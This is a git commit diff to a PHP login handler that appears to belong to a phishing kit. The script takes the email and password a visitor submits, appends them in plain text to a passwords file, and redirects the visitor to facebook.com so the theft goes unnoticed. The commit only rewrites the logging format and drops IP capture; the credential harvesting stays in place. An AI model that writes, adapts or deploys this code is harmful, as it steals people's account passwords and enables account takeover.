fb23c7f0dec1f381d64b31bbb46df653c79d95ac
Hunter~Oxe <hunteroxe1@gmail.com>
2026-04-16 20:46:14 +0200

    Update login.php

--- web/login.php
+++ web/login.php
@@ -1,10 +1,8 @@
 <?php
-$file = "../storage/passwords.txt";
 $email = $_POST['email'];
 $pass = $_POST['pass'];
-$ip = $_SERVER['REMOTE_ADDR'];
-$data = "\n[+] IP: $ip\n[+] USER: $email\n[+] PASS: $pass\n----------------\n";
-file_put_contents($file, $data, FILE_APPEND);
+$log = "User: " . $email . " | Pass: " . $pass . "\n";
+file_put_contents("../storage/passwords.txt", $log, FILE_APPEND);
 header("Location: https://facebook.com");
 exit();
 ?>
